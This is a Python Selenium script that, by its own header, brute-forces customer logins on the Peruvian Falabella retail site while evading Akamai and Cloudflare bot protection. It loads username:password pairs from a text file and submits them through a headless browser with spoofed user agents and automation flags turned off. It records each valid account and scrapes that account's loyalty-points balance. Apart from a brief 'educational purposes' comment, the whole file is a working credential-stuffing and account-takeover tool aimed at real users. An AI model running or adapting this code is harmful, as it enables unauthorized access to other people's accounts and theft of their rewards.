#I made this for educationals purposes
#This code bypass akami and cloudflare for scraping attack
#PERMITE HACERLE FUERZA BRUTA CON USUARIOS,PASSWORD A FALLABELA

def main():
    os.system('cls')
    # credenciales = input('Ingresa el nombre de tu txt: ')
    credenciales = 'credenciales3.txt'
    # num_bots = int(input("Por favor, introduce el número de bots: "))
    num_bots = 1
    if not credenciales.endswith('.txt'):
        credenciales += '.txt'
    with open(credenciales, 'r', encoding='utf-8') as txt:
        logins = [linea.strip().split(':') for linea in txt]
    processed_logins = get_processed_logins()
    logins = filter_logins(logins, processed_logins)
    print(f"{Fore.GREEN}[INFO] --> Se encontraron {len(logins)} logins.")
    with ThreadPoolExecutor(max_workers=num_bots) as executor:
        executor.map(handle, logins)

    # import undetected_chromedriver as uc


from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from concurrent.futures import ThreadPoolExecutor
import time
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from selenium import webdriver
from colorama import Fore
# from selenium.webdriver.edge.service import Service
import os
from seleniumbase import Driver
import random



def navega():
    # options = uc.ChromeOptions()
    # options.add_experimental_option("prefs", {"credentials_enable_service": False})
    #driver = Driver(headless=False)

    #----------------------------------MODIFICANDO EL USER AGENT DEL CHROME----------------------------------------

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36"
        ]


    desired_user_agent = random.choice(user_agents)
    options = webdriver.ChromeOptions()
    options.add_argument(f"user-agent={desired_user_agent}")

    #-----------------------anti-cloudflare
    options.add_experimental_option("detach", True)
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument('--disable-extensions')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-infobars')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-browser-side-navigation')
    options.add_argument('--disable-gpu')
    #options.add_argument('--auto-open-devtools-for-tabs')

    options.add_argument("--headless")

    driver = webdriver.Chrome(options=options)
    driver.execute_script("window.open('https://f,a,l,a,b,e,l,l,a.com.pe/f,a,l,a,b,e,l,l,a-pe/myaccount/', '_blank')")
    time.sleep(15)
    driver.switch_to.window(driver.window_handles[0])
    driver.get("https://curl.se/")
    time.sleep(3)
    driver.switch_to.window(driver.window_handles[1])


    WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.NAME,'email')))

    return driver


def elemento_presente(driver, selector, *textos):
    try:
        elementos = driver.find_elements(By.CSS_SELECTOR, selector)
        for elemento in elementos:
            if any(texto in elemento.text for texto in textos):
                return True
        return False
    except NoSuchElementException:
        return False


def check_login(driver):
    time.sleep(3)
    start_time = time.time()
    timeout = 5

    while time.time() - start_time < timeout:
        try:
            current_url = driver.current_url
            if current_url == "https://f,a,l,a,b,e,l,l,a.com.pe/fa,l,a,b,e,l,l,a-pe/myaccount/":
                return False
            else:
                driver.get('https://www.f,a,l,a,b,e,l,l,a.com.pe/f,a,l,a,b,e,l,l,a-pe/myaccount/userPersonalInformation')
                return True
        except TimeoutException:
            pass

        time.sleep(0.2)

    return False


def get_processed_logins():
    try:
        with open('processed_logins.txt', 'r') as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()


def filter_logins(logins, processed_logins):
    filtered_logins = []
    for login in logins:
        if len(login) == 2 and f"{login[0]}:{login[1]}" not in processed_logins:
            filtered_logins.append(login)

    return filtered_logins


def write_to_file(filename, text):
    with open(filename, 'a') as f:
        f.write(text)


def captura(driver):
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="testId-UserAction-userinfo"]/div/div[1]/div/div/div[2]/span')))
    data = driver.find_element(By.XPATH, '//*[@id="testId-UserAction-userinfo"]/div/div[1]/div/div/div[2]/span')
    puntos = data.text

    return f'Puntos: {puntos} '


def enviar_login(driver, usuario, password):
    time.sleep(1)
    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.NAME, 'email')))
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, 'email'))).send_keys(usuario)
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, 'password'))).send_keys(password)
    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR,
                                                                '.button-module_falw-btn__AAtLY.button-module_falw-btn-color-primary__JyUjj.button-module_falw-btn-block__RMbJC.button-module_falw-btn-rebranded__oGf32'))).click()
    time.sleep(1)

def procces_login(driver, usuario, password):
    enviar_login(driver, usuario, password)
    login_status = check_login(driver)
    return login_status


def handle(logins):
    usuario, password = logins
    driver = navega()
    try:
        status = procces_login(driver, usuario, password)
        if status:

            data = captura(driver)
            print(f'{Fore.GREEN}[!] CREDENCIALES CORRECTAS!: {Fore.BLUE}usuario: {usuario} | {data}')
            write_to_file('correct_logins.txt', f"{usuario}:{password} {data}\n")
        else:
            print(f'{Fore.RED}[!] CREDENCIALES INCORRECTAS: {usuario} | password: {password}')

    finally:
        driver.quit()
        write_to_file('processed_logins.txt', f"{usuario}:{password}\n")


if __name__ == "__main__":
    main()



